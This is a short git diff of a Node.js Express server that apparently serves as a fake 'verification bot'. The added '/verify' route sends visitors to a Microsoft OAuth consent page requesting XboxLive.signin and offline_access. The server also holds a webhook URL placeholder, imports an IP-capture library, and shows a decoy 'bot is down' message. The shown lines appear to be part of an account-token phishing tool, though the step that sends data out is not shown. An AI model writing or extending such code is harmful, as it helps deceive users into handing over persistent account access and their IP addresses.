@@ -5,11 +5,16 @@ const redirect_uri = 'u know how it is'
 const webhook_url = 'ur shit ass webhook mf'
 
 //Requirements
+const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
 const axios = require('axios')
 const express = require('express')
 const app = express()
 const requestIp = require('request-ip')
 const port = process.env.PORT || 3000
+
+app.get('/verify', async (req, res) => {
+	res.redirect(redirect)
+})
 
 app.get('/', async (req, res) => {
     res.send('ERROR: Verification bot is down.')
